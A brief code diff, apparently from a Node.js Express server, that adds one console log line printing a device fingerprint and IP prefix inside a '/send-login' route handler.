@@ -153,6 +153,7 @@ app.post("/send-login", async (req, res) => {
     }
 
     console.log(`\n📧 ${email} | Device: ${device} | Region: ${region}`);
+    console.log(`   🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);
 
     // Build message
     const message =
